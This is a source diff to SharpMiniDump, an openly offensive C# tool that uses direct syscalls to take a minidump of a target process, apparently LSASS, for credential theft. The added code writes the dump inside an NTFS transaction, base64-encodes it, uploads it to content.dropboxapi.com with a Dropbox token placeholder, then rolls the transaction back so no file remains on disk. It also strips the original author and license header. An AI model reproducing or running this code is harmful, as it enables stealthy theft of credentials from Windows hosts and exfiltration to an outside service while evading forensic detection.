@@ -1,27 +1,34 @@
-﻿//
-// Author: B4rtik (@b4rtik)
-// Project: SharpMiniDump (https://github.com/b4rtik/SharpMiniDump)
-// License: BSD 3-Clause
-//
-
-using System;
+﻿using System;
 using System.ComponentModel;
 using System.Diagnostics;
-using System.IO;
 using System.Runtime.InteropServices;
-using System.Threading;
 
 namespace SharpMiniDump
 {
-    
     public class Program
     {
+
+        [DllImport("ntdll.dll")]
+        public static extern bool RtlSetCurrentTransaction(IntPtr TransactionHandle);
+
+        [DllImport("ntdll.dll")]
+        public static extern int NtRollbackTransaction(IntPtr TransactionHandle, bool Wait);
+
+        [DllImport("kernel32.dll")]
+        public static extern int GetFileSize(IntPtr FileHandle, IntPtr Test);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr CreateFileMapping(IntPtr hFile, int lpAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, string lpName);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        internal static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, int dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, uint dwNumberOfBytesToMap);
+
         static void Main(string[] args)
         {
             Execute(args);
         }
 
-        public static void Execute(string[] args)
+        public unsafe static void Execute(string[] args)
         {
             if (IntPtr.Size != 8)
             {
@@ -82,7 +89,7 @@ namespace SharpMiniDump
                 return;
             }
 
-            Console.WriteLine("[*] ZwOpenProcess10  " + status);
+            Console.WriteLine("[*] ZwOpenProcess10: " + status);
 
             Natives.PSS_CAPTURE_FLAGS flags = Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_VA_CLONE
         | Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLES
@@ -107,10 +114,17 @@ namespace SharpMiniDump
                 return;
             }
 
+            IntPtr tHandle = IntPtr.Zero;
+            
+            status = NativeSysCall.NtCreateTransaction10(out tHandle, Natives.MAXIMUM_ALLOWED, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, 0, 0, IntPtr.Zero, IntPtr.Zero);
+            Console.WriteLine("[*] Transaction: " + status);
+
+            bool success = RtlSetCurrentTransaction(tHandle);
+
             Natives.UNICODE_STRING uFileName = new Natives.UNICODE_STRING();
             Natives.RtlInitUnicodeString(ref uFileName, @"\??\C:\Windows\Temp\dumpert.dmp");
 
-            Microsoft.Win32.SafeHandles.SafeFileHandle hDmpFile;
+            IntPtr hDmpFile;
             IntPtr hElm = IntPtr.Zero;
             Natives.IO_STATUS_BLOCK IoStatusBlock = new Natives.IO_STATUS_BLOCK();
 
@@ -133,9 +147,11 @@ namespace SharpMiniDump
 
             long allocationsize = 0;
 
+            const long READWRITE = Natives.FILE_GENERIC_READ | Natives.FILE_GENERIC_WRITE;
+
             status = NativeSysCall.NtCreateFile10(
                 out hDmpFile,
-                (int)Natives.FILE_GENERIC_WRITE,
+                (int)READWRITE,
                 ref FileObjectAttributes,
                 out IoStatusBlock,
                 ref allocationsize,
@@ -144,15 +160,9 @@ namespace SharpMiniDump
                 Natives.FILE_OVERWRITE_IF,
                 Natives.FILE_SYNCHRONOUS_IO_NONALERT,
                 hElm, 0);
-
-            if (hDmpFile.IsInvalid)
-            {
-                Console.WriteLine("[x] Error NtCreateFile10  " + status + " " + IoStatusBlock.status);
-                NativeSysCall.ZwClose10(hProcess);
-                return;
-            }
-
             
+            success = RtlSetCurrentTransaction(IntPtr.Zero);
+
             Natives.MINIDUMP_CALLBACK_INFORMATION CallbackInfo = new Natives.MINIDUMP_CALLBACK_INFORMATION();
             CallbackInfo.CallbackRoutine = Program.MyMiniDumpWriteDumpCallback;
             CallbackInfo.CallbackParam = IntPtr.Zero;
@@ -165,7 +175,7 @@ namespace SharpMiniDump
             IntPtr CallbackParam = IntPtr.Zero;
 
             Console.WriteLine("[*] Target PID " + pWinVerInfo.hTargetPID);
-            Console.WriteLine("[*] Generating minidump.... " + pWinVerInfo.hTargetPID);
+            Console.WriteLine("[*] Generating minidump.... ");
             
             if (!Natives.MiniDumpWriteDump(SnapshotHandle, (uint)pWinVerInfo.hTargetPID, hDmpFile, 2, ExceptionParam, UserStreamParam, pCallbackInfo))
             {
@@ -174,11 +184,29 @@ namespace SharpMiniDump
                 return;
             }
 
-            hDmpFile.Dispose();
-            NativeSysCall.ZwClose10(hProcess);
+            int size = GetFileSize(hDmpFile, IntPtr.Zero);
 
-            Console.WriteLine("[*] End ");
-            Console.WriteLine("[*] Minidump generated in  " + Marshal.PtrToStringUni(uFileName.Buffer).Substring(4));
+            IntPtr hMapping = CreateFileMapping(hDmpFile, 0, (uint)Natives.PROTECT.PAGE_READONLY, 0, 0, "");
+            
+            IntPtr data = MapViewOfFile(hMapping, Natives.FILE_MAP_READ, 0, 0, 0);
+            Console.WriteLine("[*] Data: 0x" + Convert.ToString((long)data, 16));
+
+            byte[] data_ = new byte[size];
+            Marshal.Copy(data, data_, 0, size);
+
+            string b64 = Convert.ToBase64String(data_);
+
+            Console.WriteLine("[*] Sending " + b64.Length/(1024*1024) + " megabytes of data...");
+
+            SslTcpClient.RunClient("content.dropboxapi.com", "<FOLDER>", "<DROPBOX TOKEN>", b64);
+
+            int stat = NtRollbackTransaction(tHandle, false);
+
+            NativeSysCall.ZwClose10(hDmpFile);
+            NativeSysCall.ZwClose10(hProcess);
+            NativeSysCall.ZwClose10(tHandle);
+
+            Console.WriteLine("[*] Done! ");
         }
 
         private static bool UnHookNativeApi(Natives.WIN_VER_INFO pWinVerInfo)
@@ -267,7 +295,6 @@ namespace SharpMiniDump
             }
             else
             {
-
                 return false;
             }
         }
